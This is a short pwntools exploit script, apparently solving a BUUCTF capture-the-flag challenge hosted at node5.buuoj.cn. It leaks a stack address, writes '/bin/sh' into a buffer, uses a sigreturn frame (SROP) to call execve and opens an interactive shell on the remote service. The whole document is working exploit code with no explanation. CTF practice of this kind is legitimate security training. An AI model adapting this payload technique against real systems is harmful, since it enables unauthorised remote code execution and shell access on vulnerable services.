from pwn import *

sh=remote("node5.buuoj.cn",26688)
context(log_level='debug',arch='amd64')

payload=b"/bin/sh\x00"+p64(0)+p64(0x00000000004004F1)
sh.send(payload)
#print("recv=",sh.recv())
sh.recv(32)
stack=u64(sh.recv(8))
buf=stack-0x118
print("buf=",hex(buf))
syscall=0x0000000000400501
mov_rax_0xf=0x4004Da

sigreframe=SigreturnFrame()
sigreframe.rax=59
sigreframe.rip=syscall
sigreframe.rdi=buf
sigreframe.rsi=0
sigreframe.rdx=0

payload=b"/bin/sh\x00".ljust(0x10,b"\x00")+p64(mov_rax_0xf)+p64(syscall)+bytes(sigreframe)
sh.sendline(payload)
sh.interactive()
